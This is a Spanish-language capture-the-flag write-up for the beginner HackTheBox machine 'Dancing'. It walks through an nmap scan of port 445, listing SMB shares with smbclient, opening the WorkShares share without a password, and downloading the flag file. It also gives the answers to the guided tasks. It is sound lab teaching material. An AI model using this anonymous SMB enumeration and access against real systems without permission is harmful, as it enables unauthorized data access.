@@ -1,0 +1,222 @@
+---
+titulo: "Dancing"
+plataforma: HackTheBox
+dificultad: Muy fácil
+so: Windows
+fecha: 2026-10-21
+tecnicas:
+  - Escaneo de puertos
+  - SMB
+  - Acceso sin contraseña
+resumen: "Máquina Windows con SMB en el puerto 445 y un recurso compartido, WorkShares, que se abre sin contraseña y guarda la flag."
+serie:
+  nombre: Starting Point
+  tier: 0
+borrador: false
+---
+
+Máquina del Tier 0 de Starting Point. Las preguntas guiadas (tasks) de HackTheBox aparecen plegadas en la
+sección donde se responden: intenta contestarlas antes de abrirlas.
+
+<Ruta
+  titulo="Camino seguido en Dancing, de la conexión a la flag"
+  pasos={[
+    { titulo: 'ping', detalle: 'La máquina responde' },
+    { titulo: 'nmap -p 445 -sV', detalle: 'SMB en 445/tcp' },
+    { titulo: 'smbclient -L', detalle: 'Cuatro recursos compartidos' },
+    { titulo: 'WorkShares', detalle: 'Se abre sin contraseña' },
+    { titulo: 'get flag.txt', detalle: 'En la carpeta James.P', meta: true },
+  ]}
+/>
+
+> La IP `10.129.63.71` es la que tenía la máquina en mi sesión; a ti te saldrá otra.
+
+## Reconocimiento
+
+Esta máquina gira en torno a SMB, el protocolo de Windows para compartir ficheros e impresoras en red.
+
+<Pista titulo="Tarea 1 · ¿Qué significan las siglas SMB?">
+  **Server Message Block**.
+</Pista>
+
+<Pista titulo="Tarea 2 · ¿En qué puerto funciona SMB?">
+  En el **445**.
+</Pista>
+
+Lo primero es comprobar que llega la conexión con la máquina:
+
+<Cmd c="ping 10.129.63.71" notas={{ "10.129.63.71": "IP de la máquina objetivo." }} />
+
+Como no lleva `-c`, sigue enviando paquetes hasta que se detiene con `Ctrl+C`:
+
+```text
+64 bytes from 10.129.63.71: icmp_seq=1 ttl=127 time=7.53 ms
+64 bytes from 10.129.63.71: icmp_seq=2 ttl=127 time=7.78 ms
+...
+^C
+--- 10.129.63.71 ping statistics ---
+5 packets transmitted, 5 received, 0% packet loss, time 4006ms
+```
+
+La máquina responde a todo: 5 paquetes enviados y 5 recibidos.
+
+## Enumeración
+
+Escaneo el puerto de SMB con detección de versiones:
+
+<Cmd
+  c="nmap -p 445 -sV 10.129.63.71"
+  notas={{ "445": "Solo se escanea el puerto de SMB.", "10.129.63.71": "IP de la máquina objetivo." }}
+/>
+
+```text
+PORT    STATE SERVICE       VERSION
+445/tcp open  microsoft-ds?
+```
+
+El puerto **445/tcp** está abierto y nmap le da el nombre de servicio **microsoft-ds** (lo muestra con un
+signo de interrogación y sin versión).
+
+<Pista titulo="Tarea 3 · ¿Qué nombre de servicio aparece para el puerto 445 en el escaneo de nmap?">
+  **microsoft-ds**.
+</Pista>
+
+Con SMB abierto, toca ver qué recursos compartidos ofrece el servidor. Para eso, `smbclient` con `-L`:
+
+<Cmd c="smbclient -L 10.129.63.71" notas={{ "10.129.63.71": "IP de la máquina objetivo." }} />
+
+Como no indico usuario ni contraseña, `smbclient` pide una contraseña y después muestra la lista:
+
+```text
+Password for [WORKGROUP\yconfi]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	WorkShares      Disk
+SMB1 disabled -- no workgroup available
+```
+
+Hay **cuatro** recursos compartidos. `ADMIN$`, `C$` e `IPC$` son los que trae Windows por defecto;
+`WorkShares` es el que llama la atención.
+
+<Pista titulo="Tarea 4 · ¿Qué opción (flag o switch) de smbclient sirve para listar los recursos compartidos SMB de Dancing?">
+  **-L**.
+</Pista>
+
+<Pista titulo="Tarea 5 · ¿Cuántos recursos compartidos hay en Dancing?">
+  **4**.
+</Pista>
+
+## Acceso inicial
+
+Pruebo a conectarme a cada recurso sin contraseña, con `-N`. A `C$` y `ADMIN$` no me deja entrar:
+
+<Cmd
+  c="smbclient //10.129.63.71/C$ -N"
+  notas={{ "//10.129.63.71/C$": "Recurso C$ de la máquina objetivo." }}
+/>
+
+```text
+tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+
+<Cmd
+  c="smbclient //10.129.63.71/ADMIN$ -N"
+  notas={{ "//10.129.63.71/ADMIN$": "Recurso ADMIN$ de la máquina objetivo." }}
+/>
+
+```text
+tree connect failed: NT_STATUS_ACCESS_DENIED
+```
+
+A `IPC$` sí entro, pero no es un recurso de ficheros, así que salgo con `quit`:
+
+<Cmd
+  c="smbclient //10.129.63.71/IPC$ -N"
+  notas={{ "//10.129.63.71/IPC$": "Recurso IPC$ de la máquina objetivo." }}
+/>
+
+```text
+Try "help" to get a list of possible commands.
+smb: \> quit
+```
+
+Y a `WorkShares` también entro sin contraseña:
+
+<Cmd
+  c="smbclient //10.129.63.71/WorkShares -N"
+  notas={{ "//10.129.63.71/WorkShares": "Recurso WorkShares de la máquina objetivo." }}
+/>
+
+```text
+Try "help" to get a list of possible commands.
+smb: \>
+```
+
+<Pista titulo="Tarea 6 · ¿Cómo se llama el recurso compartido al que al final podemos acceder con la contraseña en blanco?">
+  **WorkShares**.
+</Pista>
+
+Dentro, listo el contenido con `ls`. Hay dos carpetas, una por usuario:
+
+```text
+smb: \> ls
+  .                                   D        0  Mon Mar 29 04:22:01 2021
+  ..                                  D        0  Mon Mar 29 04:22:01 2021
+  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
+  James.P                             D        0  Thu Jun  3 04:38:03 2021
+```
+
+En `Amy.J` solo hay un `worknotes.txt`; la flag está en `James.P`:
+
+```text
+smb: \> cd Amy.J
+smb: \Amy.J\> ls
+  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
+smb: \Amy.J\> cd ..
+smb: \> cd James.P\
+smb: \James.P\> ls
+  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
+```
+
+Igual que en FTP, el fichero se descarga con `get` y se lee en local:
+
+```text
+smb: \James.P\> get flag.txt
+getting file \James.P\flag.txt of size 32 as flag.txt (0.7 KiloBytes/sec) (average 0.7 KiloBytes/sec)
+smb: \James.P\> quit
+```
+
+<Pista titulo="Tarea 7 · ¿Qué comando podemos usar dentro de la shell de SMB para descargar los ficheros que encontremos?">
+  **get**.
+</Pista>
+
+De vuelta en Pwnbox, el fichero está en el directorio actual:
+
+<Cmd c="ls" />
+
+<Cmd c="cat flag.txt" notas={{ "flag.txt": "Fichero descargado del recurso WorkShares." }} />
+
+La flag no se publica: la tienes que conseguir tú.
+
+<Pista titulo="Flag · Envía la flag que está en el recurso compartido SMB">
+  Está en `flag.txt`, dentro de la carpeta `James.P` del recurso `WorkShares`. Descárgala con `get` y léela
+  en tu equipo.
+</Pista>
+
+## Escalada de privilegios
+
+No hace falta: la flag se consigue descargándola de un recurso compartido abierto sin contraseña, sin
+llegar a tener una shell en la máquina.
+
+## Lecciones aprendidas
+
+- **Qué fallé:** nada importante; probé los recursos uno a uno y `C$` y `ADMIN$` me denegaron el acceso
+  antes de dar con `WorkShares`.
+- **Lo que enseña la máquina:** un recurso compartido SMB que admite conexiones sin contraseña deja ver y
+  descargar sus ficheros a cualquiera.
+- **Qué haré la próxima vez:** listar los recursos con `smbclient -L` y probar cada uno con `-N`, dejando
+  para el final los que trae Windows por defecto.
